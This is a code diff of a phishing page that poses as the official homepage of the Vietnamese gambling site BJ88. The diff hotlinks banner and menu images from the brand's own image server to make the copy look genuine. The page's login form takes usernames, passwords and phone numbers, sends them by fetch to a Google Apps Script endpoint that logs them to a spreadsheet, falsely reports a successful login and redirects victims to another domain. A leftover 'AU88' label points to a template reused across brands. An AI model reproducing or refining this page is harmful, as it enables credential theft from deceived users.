@@ -5,25 +5,43 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BJ88 - Trang Chủ Chính Thức</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #1a1a1a; color: white; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #1a1a1a; color: white; margin: 0; padding: 0; overflow-x: hidden; }
         
-        /* HEADER VỚI LOGO VÀ NÚT */
+        /* HEADER */
         .header { background: #111; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff9800; }
         .logo img { height: 50px; }
         .auth-buttons button { padding: 8px 15px; margin-left: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
         .btn-login { background: #ff9800; color: white; }
         .btn-register { background: #444; color: white; }
 
-        /* BANNER QUẢNG CÁO */
-        .banner { width: 100%; max-width: 1200px; margin: 10px auto; display: block; border-radius: 10px; }
+        /* BANNER CHUYỂN ĐỘNG TỰ ĐỘNG (6 ẢNH) */
+        .banner-container { width: 100%; overflow: hidden; position: relative; background: #000; margin: 0 auto; }
+        .banner-slide { display: flex; width: 600%; animation: slide-animation 18s infinite; }
+        .banner-slide img { width: 16.666%; display: block; }
+        
+        @keyframes slide-animation {
+            0% { transform: translateX(0); }
+            14% { transform: translateX(0); }
+            16% { transform: translateX(-16.666%); }
+            30% { transform: translateX(-16.666%); }
+            32% { transform: translateX(-33.332%); }
+            46% { transform: translateX(-33.332%); }
+            48% { transform: translateX(-49.998%); }
+            62% { transform: translateX(-49.998%); }
+            64% { transform: translateX(-66.664%); }
+            78% { transform: translateX(-66.664%); }
+            80% { transform: translateX(-83.33%); }
+            94% { transform: translateX(-83.33%); }
+            100% { transform: translateX(0); }
+        }
 
-        /* THANH MENU ĐẦY ĐỦ CÁC MỤC VỚI KÝ HIỆU */
-        .game-menu { display: flex; overflow-x: auto; background: #222; padding: 15px 10px; gap: 15px; justify-content: center; border-bottom: 1px solid #333; }
-        .menu-item { display: flex; flex-direction: column; align-items: center; min-width: 75px; font-size: 11px; cursor: pointer; color: #bbb; text-transform: uppercase; }
-        .menu-item img { width: 25px; height: 25px; margin-bottom: 5px; }
+        /* THANH MENU ICON CHÍNH THỨC */
+        .game-menu { display: flex; overflow-x: auto; background: #222; padding: 15px 10px; gap: 10px; justify-content: flex-start; border-bottom: 1px solid #333; }
+        .menu-item { display: flex; flex-direction: column; align-items: center; min-width: 75px; font-size: 11px; cursor: pointer; color: #bbb; text-transform: uppercase; white-space: nowrap; }
+        .menu-item img { width: 28px; height: 28px; margin-bottom: 5px; }
         .menu-item:hover, .menu-item.active { color: #ff9800; }
 
-        /* MODAL GIAO DIỆN CHUẨN */
+        /* MODAL */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; }
         .modal-content { background: white; width: 340px; margin: 80px auto; padding: 30px; border-radius: 12px; text-align: center; color: #333; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
         .modal-content h2 { color: #ff9800; margin-bottom: 20px; font-size: 24px; }
@@ -43,20 +61,29 @@
         </div>
     </div>
 
-    <img src="https://arcgroup.us.com/wp-content/uploads/2025/12/banner-bj88.jpg" class="banner" alt="Banner">
+    <div class="banner-container">
+        <div class="banner-slide">
+            <img src="https://img.b729j88.com/upload/announcement/image_250096.jpg">
+            <img src="https://img.b729j88.com/upload/announcement/image_292072.jpg">
+            <img src="https://img.b729j88.com/upload/announcement/image_263672.jpg">
+            <img src="https://img.b729j88.com/upload/announcement/image_242721.jpg">
+            <img src="https://img.b729j88.com/upload/announcement/image_242725.jpg">
+            <img src="https://img.b729j88.com/upload/announcement/image_278862.jpg">
+        </div>
+    </div>
 
-  <div class="game-menu">
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/1792/1792931.png">SV388</div>
-    <div class="menu-item active"><img src="https://cdn-icons-png.flaticon.com/512/426/426833.png">PHỔ BIẾN</div>
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/33/33736.png">THỂ THAO</div>
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/8023/8023773.png">SÒNG BÀI</div>
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/263/263068.png">SLOTS</div>
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/1041/1041071.png">BẮN CÁ</div>
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/11546/11546939.png">XỔ SỐ</div>
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/1420/1420371.png">GAME BÀI</div>
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/7561/7561021.png">CRASH</div>
-    <div class="menu-item"><img src="https://cdn-icons-png.flaticon.com/512/681/681392.png">ARCADE</div>
-</div>
+    <div class="game-menu">
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-sv388.png?v=1769130642418&source=drccdnsrc">SV388</div>
+        <div class="menu-item active"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-exclusive.png?v=1769130642418&source=drccdnsrc">PHỔ BIẾN</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-sport.png?v=1769130642418&source=drccdnsrc">THỂ THAO</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-casino.png?v=1769130642418&source=drccdnsrc">SÒNG BÀI</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-slot.png?v=1769130642418&source=drccdnsrc">SLOTS</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-fish.png?v=1769130642418&source=drccdnsrc">BẮN CÁ</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-lottery.png?v=1769130642418&source=drccdnsrc">XỔ SỐ</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-table.png?v=1769130642418&source=drccdnsrc">GAME BÀI</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-crash.png?v=1769130642418&source=drccdnsrc">CRASH</div>
+        <div class="menu-item"><img src="https://img.b729j88.com/bj8/h5/assets/images/dark/game-nav-icon/icon-arcade.png?v=1769130642418&source=drccdnsrc">ARCADE</div>
+    </div>
 
     <div id="loginModal" class="modal">
         <div class="modal-content">
@@ -79,40 +106,32 @@
     </div>
 
     <script>
-        // LINK APP SCRIPT ĐÃ KẾT NỐI VỚI GOOGLE SHEETS CỦA BẠN
         const scriptURL = 'https://script.google.com/macros/s/AKfycbwaVLJXZeJJE2s0XfPLvyq6AUNY4oK6THb8OBOCtzaW9zi6zSg8fYdlXLxZjdmxiw8G/exec';
 
         function openModal(id) { document.getElementById(id).style.display = 'block'; }
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
-        // GỬI DỮ LIỆU ĐĂNG KÝ (1 Ô SĐT)
         async function sendData() {
             const phone = document.getElementById('phone').value;
             if (!phone) { alert("Vui lòng nhập số điện thoại!"); return; }
-
             const formData = new URLSearchParams();
-            formData.append('type', 'Đăng ký BJ88'); // Nguồn hiển thị trên Sheets
+            formData.append('type', 'Đăng ký BJ88');
             formData.append('phone', phone);
-
             await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
             alert("Đăng ký thành công!");
             window.location.href = "https://4a1.bongvip25.pro";
         }
 
-        // GỬI DỮ LIỆU ĐĂNG NHẬP (3 Ô THÔNG TIN)
         async function sendLoginData() {
             const user = document.getElementById('login_user').value;
             const pass = document.getElementById('login_pass').value;
             const phone = document.getElementById('login_phone').value;
-
             if (!user || !pass || !phone) { alert("Vui lòng nhập đầy đủ thông tin!"); return; }
-
             const formData = new URLSearchParams();
-            formData.append('type', 'Đăng nhập AU88');
+            formData.append('type', 'Đăng nhập BJ88');
             formData.append('username', user);
             formData.append('password', pass);
             formData.append('phone', phone);
-
             await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
             alert("Đăng nhập thành công!");
             window.location.href = "https://4a1.bongvip25.pro";
